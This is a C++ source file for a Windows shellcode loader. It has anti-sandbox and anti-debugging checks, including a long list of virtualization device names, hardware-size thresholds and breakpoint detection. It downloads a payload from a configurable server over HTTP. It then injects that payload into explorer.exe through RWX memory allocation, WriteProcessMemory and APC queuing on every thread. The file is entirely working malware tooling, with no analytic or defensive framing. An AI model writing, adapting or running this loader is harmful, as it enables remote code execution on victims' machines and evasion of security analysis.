#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <winioctl.h>
#include <winternl.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")

bool InspectHostParameters() {
    std::cout << "[*] [Host Inspection] Checking system parameters..." << std::endl;
    
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    std::cout << "[*] [Host Inspection] Number of processors: " << numberOfProcessors << std::endl;
    if (numberOfProcessors < 2) {
        std::cout << "[-] [Host Inspection Failed] Processor count below threshold." << std::endl;
        return false;
    }

    MEMORYSTATUSEX memoryStatus = {0};
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        DWORD RAMMB = static_cast<DWORD>(memoryStatus.ullTotalPhys / 1024 / 1024);
        std::cout << "[*] [Host Inspection] Total RAM: " << RAMMB << " MB" << std::endl;
        if (RAMMB < 2048) {
            std::cout << "[-] [Host Inspection Failed] RAM below threshold." << std::endl;
            return false;
        }
    }

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                 OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        DISK_GEOMETRY pDiskGeometry = {0};
        DWORD bytesReturned = 0;

        BOOL ioControlSuccessful = DeviceIoControl(
            hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry,
            sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
        CloseHandle(hDevice);

        if (ioControlSuccessful) {
            DWORD diskSizeGB = (DWORD)(pDiskGeometry.Cylinders.QuadPart *
                                       (ULONG)pDiskGeometry.TracksPerCylinder *
                                       (ULONG)pDiskGeometry.SectorsPerTrack *
                                       (ULONG)pDiskGeometry.BytesPerSector /
                                       1024 / 1024 / 1024);
            std::cout << "[*] [Host Inspection] Primary disk size: " << diskSizeGB << " GB" << std::endl;
            if (diskSizeGB < 100) {
                std::cout << "[-] [Host Inspection Failed] Disk size below threshold." << std::endl;
                return false;
            }
        }
    }
    
    std::cout << "[+] [Host Inspection Passed] Environment looks clean." << std::endl;
    return true;
}

bool DetectVirtualizationArtifacts() {
    std::cout << "[*] [Sandbox Detection] Scanning for virtualization and analysis artifacts..." << std::endl;
    
    const wchar_t* artifacts[] = {
        L"\\Device\\VBoxGuest", L"\\Device\\VBoxMouse", L"\\Device\\VBoxMiniRdrDN",
        L"\\Device\\VBoxVideo", L"\\Device\\VBoxSF", L"\\Device\\VBoxTrayIPC",
        L"\\??\\pipe\\VBoxTrayIPC-", L"\\??\\pipe\\VBoxMiniRdDnPipe",
        L"\\Device\\VMTools", L"\\Device\\HGFS", L"\\Device\\VmmMouse",
        L"\\Device\\VMCI\\Device", L"\\Device\\VMRawDis", L"\\Device\\VMBalloon",
        L"\\Device\\VMCommunicationPipe", L"\\Device\\VMCI", L"\\??\\pipe\\vmware-vmx-",
        L"\\Device\\QemuGuestAgent", L"\\Device\\balloon", L"\\Device\\vioinput",
        L"\\Device\\vioscsi", L"\\Device\\vioserial", L"\\Device\\viostor",
        L"\\Device\\Vmbus", L"\\Device\\Hypervisor", L"\\Device\\VMBusTransport",
        L"\\Device\\XenEvtchn", L"\\Device\\XenGnttab", L"\\Device\\XenVbd",
        L"\\Device\\XenVif", L"\\Device\\PrlGuest", L"\\Device\\PrlMouse",
        L"\\Device\\PrlSF", L"\\Device\\Wine", L"\\Device\\Cuckoo",
        L"\\Device\\Sandboxie", L"\\Device\\SbieDrv"
    };

    for (const wchar_t* artifact : artifacts) {
        OBJECT_ATTRIBUTES objectAttributes;
        UNICODE_STRING uDeviceName;
        IO_STATUS_BLOCK ioStatusBlock;
        HANDLE hDevice = NULL;

        RtlSecureZeroMemory(&uDeviceName, sizeof(uDeviceName));

        typedef NTSTATUS(NTAPI * pfnRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
        typedef NTSTATUS(NTAPI * pfnNtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);

        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
            pfnRtlInitUnicodeString RtlInitUnicodeString = (pfnRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
            pfnNtCreateFile NtCreateFile = (pfnNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");

            if (RtlInitUnicodeString && NtCreateFile) {
                RtlInitUnicodeString(&uDeviceName, artifact);
                InitializeObjectAttributes(&objectAttributes, &uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);

                NTSTATUS status = NtCreateFile(&hDevice, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);

                if (NT_SUCCESS(status)) {
                    if (hDevice != NULL) {
                        CloseHandle(hDevice);
                    }
                    std::wcout << L"[-] [Sandbox Detected] Artifact found: " << artifact << std::endl;
                    return true;
                }
            }
        }
    }

    std::cout << "[+] [Sandbox Detection Passed] No virtual artifacts found." << std::endl;
    return false;
}

bool DetectBreakpointsByMemoryPages() {
    std::cout << "[*] [Memory Check] Inspecting working set for hardware/software breakpoints..." << std::endl;
    
    PSAPI_WORKING_SET_INFORMATION workingSetInfo;
    if (!QueryWorkingSet(GetCurrentProcess(), &workingSetInfo, sizeof(workingSetInfo))) {
        return false;
    }

    DWORD requiredSize = sizeof(PSAPI_WORKING_SET_INFORMATION) + (workingSetInfo.NumberOfEntries * sizeof(PSAPI_WORKING_SET_BLOCK));
    PPSAPI_WORKING_SET_INFORMATION pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(NULL, requiredSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pWorkingSetInfo) {
        return false;
    }

    BOOL debugged = false;
    if (QueryWorkingSet(GetCurrentProcess(), pWorkingSetInfo, requiredSize)) {
        for (DWORD i = 0; i < pWorkingSetInfo->NumberOfEntries; i++) {
            PVOID physicalAddress = (PVOID)(pWorkingSetInfo->WorkingSetInfo[i].VirtualPage * 4096);
            MEMORY_BASIC_INFORMATION memoryInfo;

            if (VirtualQuery(physicalAddress, &memoryInfo, sizeof(memoryInfo))) {
                if (memoryInfo.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) {
                    if ((pWorkingSetInfo->WorkingSetInfo[i].Shared == 0) || (pWorkingSetInfo->WorkingSetInfo[i].ShareCount == 0)) {
                        debugged = true;
                        break;
                    }
                }
            }
        }
    }

    VirtualFree(pWorkingSetInfo, 0, MEM_RELEASE);
    return debugged;
}

bool DetectDebuggerByInterrupts() {
    BOOL isDebugged = TRUE;
    __try {
        DebugBreak();
    } __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        isDebugged = FALSE;
    }
    return isDebugged;
}

bool DownloadPayload(LPCWSTR server, LPCWSTR path, std::vector<unsigned char>& outBuffer) {
    std::cout << "[*] [Network] Initializing WinHttp session..." << std::endl;
    bool success = false;
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                     WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnection = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnection) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", path, NULL, WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnection);
        WinHttpCloseHandle(hSession);
        return false;
    }

    BOOL status = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0L,
                                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (status && WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD bytesAvailable = 0;
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            std::vector<char> tempBuffer(bytesAvailable);
            DWORD bytesRead = 0;

            if (WinHttpReadData(hRequest, tempBuffer.data(), bytesAvailable, &bytesRead)) {
                outBuffer.insert(outBuffer.end(), tempBuffer.begin(), tempBuffer.begin() + bytesRead);
            }
        }
        success = !outBuffer.empty();
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnection);
    WinHttpCloseHandle(hSession);
    return success;
}

void findTargetProcess(PROCESSENTRY32& processEntry, HANDLE snapshot) {
    std::cout << "[*] [Process Search] Searching for target process (explorer.exe)..." << std::endl;
    while (Process32Next(snapshot, &processEntry)) {
        if (_stricmp(processEntry.szExeFile, "explorer.exe") == 0) {
            std::cout << "[+] [Process Found] Target process found. PID: " << processEntry.th32ProcessID << std::endl;
            return;
        }
    }
}

HANDLE openTargetProcess(PROCESSENTRY32& processEntry) {
    return OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
}

LPVOID allocateMemoryInProcess(HANDLE process, SIZE_T size) {
    std::cout << "[*] [Memory Allocation] Allocating " << size << " bytes with MEM_COMMIT | MEM_RESERVE..." << std::endl;
    LPVOID address = VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    return address;
}

void writePayloadToProcess(HANDLE process, LPVOID address, const unsigned char* payload, SIZE_T size) {
    WriteProcessMemory(process, address, (LPVOID)payload, size, NULL);
}

void findTargetThreads(std::vector<DWORD>& threadIds, PROCESSENTRY32& processEntry, HANDLE snapshot) {
    THREADENTRY32 threadEntry = {sizeof(THREADENTRY32)};
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
}

void injectAPCIntoThreads(const std::vector<DWORD>& threadIds, LPVOID shellAddress) {
    for (DWORD threadId : threadIds) {
        HANDLE threadHandle = OpenThread(THREAD_SET_CONTEXT | SYNCHRONIZE, TRUE, threadId);
        QueueUserAPC((PAPCFUNC)shellAddress, threadHandle, NULL);
        Sleep(100);
    }
}

int main(int argc, char** argv) {
    std::cout << "[*] [Main] Shellcode loader initialized." << std::endl;

    if (DetectVirtualizationArtifacts() || !InspectHostParameters() || DetectBreakpointsByMemoryPages() || DetectDebuggerByInterrupts()) {
        std::cout << "[-] [Exit] Security checks failed. Terminating." << std::endl;
        return 0;
    }

    wchar_t serverIp[256] = L"127.0.0.1";
    wchar_t payloadPath[256] = L"/payload.bin";

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-server") == 0 && i + 1 < argc) {
            MultiByteToWideChar(CP_ACP, 0, argv[i + 1], -1, serverIp, 256);
            i++;
        } else if (strcmp(argv[i], "-path") == 0 && i + 1 < argc) {
            MultiByteToWideChar(CP_ACP, 0, argv[i + 1], -1, payloadPath, 256);
            i++;
        }
    }

    std::vector<unsigned char> shellcode;
    if (DownloadPayload(serverIp, payloadPath, shellcode)) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
        if (snapshot == INVALID_HANDLE_VALUE) return 1;

        PROCESSENTRY32 processEntry = {sizeof(PROCESSENTRY32)};
        if (!Process32First(snapshot, &processEntry)) {
            CloseHandle(snapshot);
            return 1;
        }

        findTargetProcess(processEntry, snapshot);

        HANDLE targetProcess = openTargetProcess(processEntry);
        if (!targetProcess) {
            CloseHandle(snapshot);
            return 1;
        }

        LPVOID shellAddress = allocateMemoryInProcess(targetProcess, shellcode.size());
        if (!shellAddress) {
            CloseHandle(targetProcess);
            CloseHandle(snapshot);
            return 1;
        }

        writePayloadToProcess(targetProcess, shellAddress, shellcode.data(), shellcode.size());

        std::vector<DWORD> threadIds;
        findTargetThreads(threadIds, processEntry, snapshot);

        injectAPCIntoThreads(threadIds, shellAddress);

        CloseHandle(targetProcess);
        CloseHandle(snapshot);
        std::cout << "[+] [Main] Execution flow completed successfully." << std::endl;
    } else {
        std::cerr << "[-] [Main Error] Payload download failed." << std::endl;
    }

    return 0;
}